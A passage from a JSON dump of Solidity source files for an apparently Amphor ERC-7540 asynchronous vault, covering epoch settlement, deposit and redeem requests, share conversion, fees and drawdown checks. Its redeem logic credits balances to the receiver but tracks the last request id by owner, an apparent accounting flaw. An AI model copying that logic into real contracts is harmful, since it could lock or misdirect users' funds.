uint256 assetsToWithdraw = pendingRedeem.mulDiv(\n            _lastSavedBalance + pendingDeposit + 1,\n            totalSupply + sharesToMint + 1,\n            Math.Rounding.Floor\n        );\n\n        uint256 totalAssetsSnapshotForRedeem =\n            _lastSavedBalance + pendingDeposit + 1;\n        uint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;\n\n        settleValues = SettleValues({\n            lastSavedBalance: _lastSavedBalance + fees,\n            fees: fees,\n            pendingRedeem: pendingRedeem,\n            sharesToMint: sharesToMint,\n            pendingDeposit: pendingDeposit,\n            assetsToWithdraw: assetsToWithdraw,\n            totalAssetsSnapshotForDeposit: totalAssetsSnapshotForDeposit,\n            totalSupplySnapshotForDeposit: totalSupplySnapshotForDeposit,\n            totalAssetsSnapshotForRedeem: totalAssetsSnapshotForRedeem,\n            totalSupplySnapshotForRedeem: totalSupplySnapshotForRedeem\n        });\n\n        if (pendingDeposit > assetsToWithdraw) {\n            assetsToOwner = pendingDeposit - assetsToWithdraw;\n        } else if (pendingDeposit < assetsToWithdraw) {\n            assetsToVault = assetsToWithdraw - pendingDeposit;\n        }\n    }\n\n    /**\n     * @dev see EIP\n     * @param interfaceId The interface id to check for.\n     * @return True if the contract implements the interface.\n     */\n    function supportsInterface(bytes4 interfaceId) public pure returns (bool) {\n        return interfaceId == type(IERC165).interfaceId\n            || interfaceId == type(IERC7540Redeem).interfaceId\n            || interfaceId == type(IERC7540Deposit).interfaceId;\n    }\n\n    // transfer must happen before this function is called\n    function _createDepositRequest(\n        uint256 assets,\n        address receiver,\n        address owner,\n        bytes memory data\n    )\n        internal\n    {\n        epochs[epochId].depositRequestBalance[receiver] += assets;\n        if (lastDepositRequestId[receiver] != epochId) {\n            lastDepositRequestId[receiver] = epochId;\n        }\n\n        if (\n            data.length > 0\n                && ERC7540Receiver(receiver).onERC7540DepositReceived(\n                    _msgSender(), owner, epochId, data\n                ) != ERC7540Receiver.onERC7540DepositReceived.selector\n        ) revert ReceiverFailed();\n\n        emit DepositRequest(receiver, owner, epochId, _msgSender(), assets);\n    }\n\n    function _createRedeemRequest(\n        uint256 shares,\n        address receiver,\n        address owner,\n        bytes memory data\n    )\n        internal\n    {\n        epochs[epochId].redeemRequestBalance[receiver] += shares;\n        lastRedeemRequestId[owner] = epochId;\n\n        if (\n            data.length > 0\n                && ERC7540Receiver(receiver).onERC7540RedeemReceived(\n                    _msgSender(), owner, epochId, data\n                ) != ERC7540Receiver.onERC7540RedeemReceived.selector\n        ) revert ReceiverFailed();\n\n        emit RedeemRequest(receiver, owner, epochId, _msgSender(), shares);\n    }\n\n    function _claimDeposit(\n        address owner,\n        address receiver\n    )\n        internal\n        returns (uint256 shares)\n    {\n        shares = previewClaimDeposit(owner);\n\n        uint256 lastRequestId = lastDepositRequestId[owner];\n        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n        epochs[lastRequestId].depositRequestBalance[owner] = 0;\n        _update(address(claimableSilo), receiver, shares);\n        emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);\n    }\n\n    function _claimRedeem(\n        address owner,\n        address receiver\n    )\n        internal\n        whenNotPaused\n        returns (uint256 assets)\n    {\n        assets = previewClaimRedeem(owner);\n        uint256 lastRequestId = lastRedeemRequestId[owner];\n        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n        epochs[lastRequestId].redeemRequestBalance[owner] = 0;\n        _asset.safeTransferFrom(address(claimableSilo), address(this), assets);\n        _asset.transfer(receiver, assets);\n        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);\n    }\n\n    function _settle(uint256 newSavedBalance)\n        internal\n        onlyOwner\n        whenNotPaused\n        whenClosed\n        returns (uint256, uint256)\n    {\n        (\n            uint256 assetsToOwner,\n            uint256 assetsToVault,\n            SettleValues memory settleValues\n        ) = previewSettle(newSavedBalance);\n\n        emit EpochEnd(\n            block.timestamp,\n            lastSavedBalance,\n            newSavedBalance,\n            settleValues.fees,\n            totalSupply()\n        );\n\n        // Settle the shares balance\n        _burn(address(pendingSilo), settleValues.pendingRedeem);\n        _mint(address(claimableSilo), settleValues.sharesToMint);\n\n        ///////////////////////////\n        // Settle assets balance //\n        ///////////////////////////\n        // either there are more deposits than withdrawals\n        if (settleValues.pendingDeposit > settleValues.assetsToWithdraw) {\n            _asset.safeTransferFrom(\n                address(pendingSilo), owner(), assetsToOwner\n            );\n            if (settleValues.assetsToWithdraw > 0) {\n                _asset.safeTransferFrom(\n                    address(pendingSilo),\n                    address(claimableSilo),\n                    settleValues.assetsToWithdraw\n                );\n            }\n        } else if (settleValues.pendingDeposit < settleValues.assetsToWithdraw)\n        {\n            _asset.safeTransferFrom(\n                owner(), address(claimableSilo), assetsToVault\n            );\n            if (settleValues.pendingDeposit > 0) {\n                _asset.safeTransferFrom(\n                    address(pendingSilo),\n                    address(claimableSilo),\n                    settleValues.pendingDeposit\n                );\n            }\n        } else if (settleValues.pendingDeposit > 0) {\n            // if _pendingDeposit == assetsToWithdraw AND _pendingDeposit > 0\n            // (and assetsToWithdraw > 0)\n            _asset.safeTransferFrom(\n                address(pendingSilo),\n                address(claimableSilo),\n                settleValues.assetsToWithdraw\n            );\n        }\n\n        emit Deposit(\n            address(pendingSilo),\n            address(claimableSilo),\n            settleValues.pendingDeposit,\n            settleValues.sharesToMint\n        );\n\n        emit Withdraw(\n            address(pendingSilo),\n            address(claimableSilo),\n            address(pendingSilo),\n            settleValues.assetsToWithdraw,\n            settleValues.pendingRedeem\n        );\n\n        settleValues.lastSavedBalance = settleValues.lastSavedBalance\n            - settleValues.fees + settleValues.pendingDeposit\n            - settleValues.assetsToWithdraw;\n        lastSavedBalance = settleValues.lastSavedBalance;\n\n        epochs[epochId].totalSupplySnapshotForDeposit =\n            settleValues.totalSupplySnapshotForDeposit;\n        epochs[epochId].totalAssetsSnapshotForDeposit =\n            settleValues.totalAssetsSnapshotForDeposit;\n        epochs[epochId].totalSupplySnapshotForRedeem =\n            settleValues.totalSupplySnapshotForRedeem;\n        epochs[epochId].totalAssetsSnapshotForRedeem =\n            settleValues.totalAssetsSnapshotForRedeem;\n\n        epochId++;\n\n        return (settleValues.lastSavedBalance, totalSupply());\n    }\n\n    function isCurrentEpoch(uint256 requestId) internal view returns (bool) {\n        return requestId == epochId;\n    }\n\n    function _convertToShares(\n        uint256 assets,\n        uint256 requestId,\n        Math.Rounding rounding\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        if (isCurrentEpoch(requestId)) {\n            return 0;\n        }\n        uint256 totalAssets =\n            epochs[requestId].totalAssetsSnapshotForDeposit + 1;\n        uint256 totalSupply =\n            epochs[requestId].totalSupplySnapshotForDeposit + 1;\n\n        return assets.mulDiv(totalSupply, totalAssets, rounding);\n    }\n\n    function _convertToAssets(\n        uint256 shares,\n        uint256 requestId,\n        Math.Rounding rounding\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        if (isCurrentEpoch(requestId)) {\n            return 0;\n        }\n        uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;\n        uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;\n\n        return shares.mulDiv(totalAssets, totalSupply, rounding);\n    }\n\n    function _checkMaxDrawdown(\n        uint256 _lastSavedBalance,\n        uint256 newSavedBalance\n    )\n        internal\n        view\n    {\n        if (\n            newSavedBalance\n                < _lastSavedBalance.mulDiv(\n                    BPS_DIVIDER - _maxDrawdown, BPS_DIVIDER, Math.Rounding.Ceil\n                )\n        ) revert MaxDrawdownReached();\n    }\n\n    function _computeFees(\n        uint256 _lastSavedBalance,\n        uint256 newSavedBalance\n    )\n        internal\n        view\n        returns (uint256 fees)\n    {\n        if (newSavedBalance > _lastSavedBalance && feesInBps > 0) {\n            uint256 profits;\n            unchecked {\n                profits = newSavedBalance - _lastSavedBalance;\n            }\n            fees = (profits).mulDiv(feesInBps, BPS_DIVIDER, Math.Rounding.Floor);\n        }\n    }\n}"
    },
    {
      "filename": "asynchronous-vault/src/AsyncSynthVault.sol",
      "content": "//SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport {\n    IERC7540,\n    IERC165,\n    IERC7540Redeem,\n    IERC7540Deposit\n} from \"./interfaces/IERC7540.sol\";\nimport { ERC7540Receiver } from \"./interfaces/ERC7540Receiver.sol\";\nimport { IERC20, SafeERC20, Math, PermitParams } from \"./SyncSynthVault.sol\";\n\nimport { SyncSynthVault } from \"./SyncSynthVault.sol\";\n\n/**\n *         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%=::::::=%@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*=#=--=*=*@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:*=    =#:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@:@@    @@:@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*-.    .-*@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@*        *@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@.         .@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@*  Amphor  *@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@*==========#@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@+==========*@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@*   ASync   *@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@%  Vault  %@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@=        +@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%       %@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@=      =@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@%     .@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@=    =@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@%----%@@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@%+:::::+%@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@########@@@@@@@@@@@@@@@@@@@@@\n *         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n *\n *            d8888                        888\n *           d88888                        888\n *          d88P888                        888\n *         d88P 888 88888b.d88b.  88888b.  88888b.   .d88b.  888d888\n *        d88P  888 888 \"888 \"88b 888 \"88b 888 \"88b d88\"\"88b 888P\"\n *       d88P   888 888  888  888 888  888 888  888 888  888 888\n *      d8888888888 888  888  888 888 d88P 888  888 Y88..88P 888\n *     d88P     888 888  888  888 88888P\"  888  888  \"Y88P\"  888.io\n *                                888\n *                                888\n *                                888\n */\n\n/*\n * ########\n * # LIBS #\n * ########\n*/\nusing Math for uint256; // only used for `mulDiv` operations.\nusing SafeERC20 for IERC20; // `safeTransfer` and `safeTransferFrom`\n\n/*\n    This structur"
    }
  ]
}